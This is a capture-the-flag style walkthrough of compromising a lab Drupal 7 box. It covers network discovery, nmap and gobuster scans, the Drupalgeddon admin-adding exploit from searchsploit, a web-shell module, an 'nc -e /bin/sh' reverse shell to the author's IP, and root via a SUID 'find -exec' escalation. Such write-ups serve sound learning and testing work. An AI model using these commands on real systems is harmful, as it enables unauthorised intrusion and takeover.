# Start 

>### Box are not showing any ip address so let's start with scanning the network to find out target. 

1. netdiscover.
	![netdiscover](https://i.ibb.co/9Gv35LX/dc-pic-1.png) Ours target is --> 192.168.0.119 
	> Our box is running on virtual box so it's mac vendor is **PCS Systemtechnik**

## Scanning
next step to scan the target and find out the operating system running service and open port on the server. For scanning we used ***nmap*** .

>## nmap -sV -sC -oA scan1 192.168.0.119
![nmap Scan](https://i.ibb.co/zQRDGmp/dc1.png) 

it's a *'noisy'* nmap scan. **-sV** for  open ports to determine service/version info. **-sC** equivalent to ***--script=default*** .it will run some default **nmap** script against the target host.


**Nmap** output shows us that there are 3 ports open. 22(SSH),80(HTTP),111(RPC).nmap also find the **robots.txt** and site is running **Drupal CMS (Drupal 7 )**.Open the IP address in the browser to see how the web page look like.

## Hidden directory search
**Nmap** find the robots.txt file in that file we see some on hidden directory.but i try to brute force the web directory with **gobuster**
>## gobuster dir -u http://192.168.0.119/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirScan

## Drupal
After a bit poking around,I search in google for brupal scan and try to find out some tools and any interesting about drupal.I find a tool in online called **"Droopescan"** .

![droopescan](https://i.ibb.co/tsC1NRm/droopscan.png)

Interesting! Most of it doesn't mean much to me,I'm not a Drupal pro,but something in the back of my mind grabs my attention when I see the Drupal versions again. So search in **searchsploit** tools.This is offline database of exploit-db.com.
>## searchsploit Drupal 7

![searchsploit](https://i.ibb.co/M56XvwG/dc5.png)

**Drupalgeddon** has **SQL Injection** that can **(add Admin User)** so i download the exploit  with this command.
>## searchsploit -m exploits/php/webapps/34984.py

![exploit](https://i.ibb.co/Gk67tPz/dc6.png)

Running the exploit with python we can see it exploit need **-t for target url** ,**-u useranem** and **-p password**.I give the target url ,username and password.
![runiing exploit](https://i.ibb.co/KjMQmCn/dc7.png)

#### Using that credentials to login  as administrator.
![username](https://i.ibb.co/sCNDD4N/dc8.png)

Now we need a Shell for get inside of that server. So I search drupal shell in google and i found a module that give  a web shell.

![google search](https://i.ibb.co/HFrgKDJ/dc-shell.png)

 Find out that  module can be install from url. So i copy the module url.
 
![google download](https://i.ibb.co/bLw6Xz3/dc-shell-plg.png)

![install module](https://i.ibb.co/4RfKb0R/scre-install.png)

To use that shell module.We need to active the module.

![shell active](https://i.ibb.co/2MKzFXt/dc-shell-active.png)

After Search the **"Shell"** url ,find in Navigation menu.After visiting it.Now we can run commands on the back-end server . So, I decided to get a reverse shell to my machine using "nc" utility.

![web shell](https://i.ibb.co/5FRx5zs/dc-shell-in-website.png)


For the native shell i use my favorite website **"http://pentestmonkey.net"** 
>``` nc -e /bin/sh 192.168.0.109 9001``` 

![webshell](https://i.ibb.co/mvDhSJD/webshell.png)

![Native shell](https://i.ibb.co/g7289jP/nativeshwll.png)

## Post-exploitation

Now, I start checking for rooting the server. There are many techniques to do That.One of them is searching for the binaries owned by the root user and has "suid", which is a feature is a feature is Linux that allows users to execute files with the permissions of a specific user. Find search for files that has we run a command.

> ``` find / -perm /4000 2>/dev/null ```

![permission](https://i.ibb.co/w60C4ds/find-permmisstion.png)

Now we can get root user to exploit the find with this command

>``` find . -exec '/bin/sh' \; ```

![root]()

Hope that you learn something new by reading this post.
